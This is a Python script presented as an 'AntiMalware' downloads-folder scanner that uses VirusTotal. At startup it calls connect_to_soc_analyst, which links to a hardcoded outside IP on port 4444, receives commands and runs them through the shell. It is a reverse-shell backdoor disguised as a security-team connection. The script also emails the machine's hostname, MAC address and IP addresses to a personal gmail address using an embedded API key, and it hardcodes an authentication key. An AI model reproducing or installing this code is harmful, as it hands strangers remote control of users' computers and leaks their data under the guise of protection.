import os
import json
import platform
import uuid
import requests
import threading
import socket
import subprocess
import time
import logging
import base64
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from virustotal_python import Virustotal
from rich.console import Console
from rich.logging import RichHandler
import resend
from cryptography.fernet import Fernet
from plyer import notification  
console = Console()

# Log configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[RichHandler(console=console, rich_tracebacks=True)]
)
logger = logging.getLogger("AntiMalware")

# Constants
BACKUP_DIR = "backup_reports"
TEMP_DIR = "temp_processing"
LOG_DIR = "logs"  # Adding a new constant for logs directory
REQUIRED_DIRS = [BACKUP_DIR, TEMP_DIR, LOG_DIR]  # List of required directories
SERVER_IP = "165.227.81.186"
SERVER_PORT = 5050
VIRUSTOTAL_API_KEY = "<YOUR_VIRUS_TOTAL_API>"
MONITORED_EXTENSIONS = {".exe", ".dll", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".sh", ".bin", ".msi", ".jar"}
THREAD_COUNT = 5
AUTH_KEY = b"SuperSecretKey123!"

# Track processed files to avoid duplicate analysis
processed_files = set()

# Encryption setup
def generate_key(auth_key):
    return base64.urlsafe_b64encode(auth_key.ljust(32)[:32])

ENCRYPTION_KEY = generate_key(AUTH_KEY)
cipher = Fernet(ENCRYPTION_KEY)

# Helper functions
def notify_user(title, message):
    try:
        # Use plyer for cross-platform notifications
        notification.notify(
            title=title,
            message=message,
            app_name="AntiMalware",
            timeout=10  # Notification will disappear after 10 seconds
        )
        console.print(f"[bold green][{title}][/] {message}")
    except Exception as e:
        logger.error(f"Failed to send notification: {e}")
        console.print(f"[bold red][Notification Error][/] {e}")

def get_desktop_path():
    try:
        if platform.system() == "Windows":
            return os.path.join(os.environ["USERPROFILE"], "Downloads")
        elif platform.system() == "Darwin":  # macOS
            return os.path.join(os.path.expanduser("~"), "Downloads")
        elif platform.system() == "Linux":
            # Check for XDG user dirs first
            try:
                with open(os.path.expanduser("~/.config/user-dirs.dirs"), "r") as f:
                    for line in f:
                        if line.startswith("XDG_DESKTOP_DIR"):
                            return os.path.expanduser(line.split("=")[1].strip().strip('"'))
            except:
                pass
            # Fallback to standard Desktop directory
            return os.path.join(os.path.expanduser("~"), "Downloads")
        return None
    except Exception as e:
        logger.error(f"Failed to determine desktop path: {e}")
        return None

def fetch_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        if response.status_code == 200:
            return response.json()['ip']
        return 'No public IP'
    except Exception as e:
        logger.error(f"Failed to fetch public IP: {e}")
        return 'No public IP'

def is_file_in_use(file_path):
    try:
        # Attempt to open the file in exclusive mode
        with open(file_path, "a", buffering=0):
            pass
        return False  
    except IOError:
        return True 

# Helper function to wait until the file is fully downloaded
def wait_until_file_complete(file_path, retry_interval=1, max_retries=30):
    retries = 0
    while retries < max_retries:
        if not is_file_in_use(file_path):
            logger.info(f"File is fully downloaded: {file_path}")
            return True
        logger.info(f"Waiting for file to complete download: {file_path} (Attempt {retries + 1}/{max_retries})")
        time.sleep(retry_interval)
        retries += 1
    logger.warning(f"File download timed out: {file_path}")
    return False

# File processing and monitoring
def process_file(file_path, virustotal, backup_dir, server_ip, server_port):
    try:
        # Skip if file has already been processed
        if file_path in processed_files:
            logger.info(f"File already processed: {file_path}")
            return
        processed_files.add(file_path)

        # Wait until the file is fully downloaded
        if not wait_until_file_complete(file_path):
            logger.error(f"File download timed out: {file_path}")
            return

        # Move file to temp directory
        temp_path = os.path.join(TEMP_DIR, os.path.basename(file_path))
        os.rename(file_path, temp_path)
        logger.info(f"Moved file to temp directory: {temp_path}")

        # Submit file for analysis
        with open(temp_path, "rb") as f:
            response = virustotal.request("files", files={"file": (os.path.basename(temp_path), f)}, method="POST")
            analysis_id = response.json()["data"]["id"]
            logger.info(f'Fetched Sandbox_ID <=> {analysis_id}')
            notify_user("SandbOX ID", f"Sandbox ID retrieved {analysis_id}")

        # Wait for analysis to complete
        while True:
            result = virustotal.request(f"analyses/{analysis_id}", method="GET").json()
            if result["data"]["attributes"]["status"] == "completed":
                if result["data"]["attributes"]["stats"]["malicious"] > 0:
                    # File is infected
                    logger.warning(f"Malicious file detected: {temp_path}")
                    send_alert_notification(temp_path)
                    os.remove(temp_path)
                    send_notification(infected_file=temp_path)
                    send_json_to_server(server_ip, server_port, os.path.basename(temp_path), result)
                else:
                    # File is clean
                    logger.info(f"File is clean: {temp_path}")
                    os.rename(temp_path, file_path)
                    logger.info(f"Moved file back to original location: {file_path}")

                # Save analysis report
                backup_path = os.path.join(backup_dir, f"{os.path.basename(temp_path)}.json")
                with open(backup_path, "w") as backup_file:
                    json.dump(result, backup_file, indent=4)
                break
            time.sleep(5)
    except Exception as e:
        logger.error(f"Error processing file {temp_path}: {e}")

# Connect to the SOC analyst server.
def connect_to_soc_analyst(analyst_node):
    try:
        SERVER_HOST = analyst_node
        SERVER_PORT = 4444

        def encrypt_message(message):
            return cipher.encrypt(message.encode())

        def decrypt_message(message):
            return cipher.decrypt(message).decode()

        def execute_command(command):
            try:
                if os.name == "nt":  # Windows
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                else:  # Linux & Mac
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = output.stdout + output.stderr
            except Exception as e:
                output = str(e)
            return output

        def start_client():
            while True:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    client.connect((SERVER_HOST, SERVER_PORT))
                    notify_user("Anti-Malware", "[+] Connected to SOC server")

                    # Send authentication key
                    client.send(encrypt_message(AUTH_KEY.decode()))
                    auth_response = decrypt_message(client.recv(1024))

                    if auth_response != "Authentication Successful":
                        notify_user("Anti-Malware", "[!] Authentication failed!")
                        client.close()
                        return

                    notify_user("Anti-Malware", "[+] Authentication successful!")

                    while True:
                        command = decrypt_message(client.recv(4096))
                        if not command:
                            break
                        output = execute_command(command)
                        client.send(encrypt_message(output))

                    client.close()

                except Exception as e:
                    notify_user("SOC Node", f"Connection Error: {e}")
                time.sleep(5)

        thread = threading.Thread(target=start_client, daemon=True)
        thread.start()

    except Exception as e:
        notify_user("SOC Node", f"An Error Occurred: {e}")

def monitor_directory(path, file_queue, extensions):
    class Handler(FileSystemEventHandler):
        def on_created(self, event):
            if not event.is_directory and os.path.splitext(event.src_path)[1].lower() in extensions:
                file_queue.put(event.src_path)

    observer = Observer()
    observer.schedule(Handler(), path, recursive=True)
    observer.start()
    logger.info(f"Monitoring started on {path}")
    notify_user("Monitoring Started", f"Monitoring has started on {path}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Notification and reporting
def send_notification(infected_file):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            mac = uuid.getnode()
            mac_address = ':'.join(['{:02x}'.format((mac >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
            hostname = platform.node()

        resend.api_key = "re_JkVriew5_Mjxv9A53tEVUcFYtBhu9qX2S"
        alert_data = {
            "Computer Host": hostname,
            "MAC Address": mac_address,
            "IP Address": f"Public IP: {fetch_public_ip()}, Local IP: {ip_address}",
            "File Name": infected_file,
        }

        html_content = f"""
        <html>
            <body style="font-family: Arial, sans-serif; line-height: 1.5;">
                <p>Hello Admin,</p>
                <p style="color: red; font-weight: bold;">Suspicious File Detected and Deleted!</p>
                <table border="1" cellpadding="10" cellspacing="0" style="border-collapse: collapse; width: 100%; max-width: 600px;">
                    <thead style="background-color: #f2f2f2;">
                        <tr>
                            <th style="text-align: left; color: #333;">Detail</th>
                            <th style="text-align: left; color: #333;">Value</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td style="background-color: #f9f9f9;">Computer Host</td>
                            <td>{alert_data['Computer Host']}</td>
                        </tr>
                        <tr>
                            <td>MAC Address</td>
                            <td>{alert_data['MAC Address']}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td>IP Address</td>
                            <td>{alert_data['IP Address']}</td>
                        </tr>
                        <tr>
                            <td>File Name</td>
                            <td>{alert_data['File Name']}</td>
                        </tr>
                    </tbody>
                </table>
                <p>Please take immediate action to investigate the issue.</p>
                <p style="color: gray;">Thank you,<br>Anti-Malware Team</p>
            </body>
        </html>
        """

        params = {
            "from": "Anti-Malware Notification <support@securitygroup.pro>",
            "to": ["hkihiyo3@gmail.com"],
            "subject": "Anti-Malware Alert",
            "html": html_content,
        }
        email = resend.Emails.send(params)

        if email.get('id'):
            notify_user("Antimalware", "Email successfully sent")
        else:
            notify_user("Antimalware", "Email not sent")
    except Exception as e:
        logger.error(f"Failed to send notification: {e}")

def send_json_to_server(ip, host, filename, data):
    """Send JSON data to the server."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, host))
            payload = json.dumps(data)
            s.sendall(payload.encode("utf-8"))
            logger.info(f"Sent JSON report to server: {filename}")
    except Exception as e:
        logger.error(f"Failed to send JSON report: {e}")

def send_alert_notification(infected_file):
    """Send an alert notification with system and file details."""
    try:
        hostname = platform.node()
        mac_address = ':'.join(f'{uuid.getnode() >> i & 0xff:02x}' for i in range(0, 8 * 6, 8)[::-1])
        ip_address = socket.gethostbyname(socket.gethostname())

        alert_data = {
            "Computer Host": hostname,
            "MAC Address": mac_address,
            "IP Address": ip_address,
            "File Name": infected_file,
        }

        logger.warning(f"Malicious file detected: {infected_file}")
        notify_user("Malware Alert", f"Suspicious file detected and deleted: {infected_file}")
    except Exception as e:
        logger.error(f"Failed to send alert notification: {e}")

def check_create_directories():
    """Check if required directories exist and create them if they don't."""
    try:
        for directory in REQUIRED_DIRS:
            if not os.path.exists(directory):
                os.makedirs(directory)
                logger.info(f"Created directory: {directory}")
            else:
                logger.info(f"Directory exists: {directory}")
    except Exception as e:
        logger.error(f"Failed to create directories: {e}")
        raise

# Main function
def main():
    # Add directory check at the start
    check_create_directories()
    
    virustotal = Virustotal(VIRUSTOTAL_API_KEY)
    file_queue = Queue()

    desktop_path = get_desktop_path()
    if not desktop_path:
        logger.error("Failed to determine desktop path.")
        return

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        executor.submit(monitor_directory, desktop_path, file_queue, MONITORED_EXTENSIONS)

        while True:
            file_path = file_queue.get()
            executor.submit(process_file, file_path, virustotal, BACKUP_DIR, SERVER_IP, SERVER_PORT)
            file_queue.task_done()

if __name__ == "__main__":
    try:
        connect_to_soc_analyst(analyst_node='165.227.81.186')
        notify_user("Antimalware", f"Service started to Monitor {get_desktop_path()}")
        main()
    except KeyboardInterrupt:
        notify_user("Exiting", "Anti-Malware application is shutting down.")
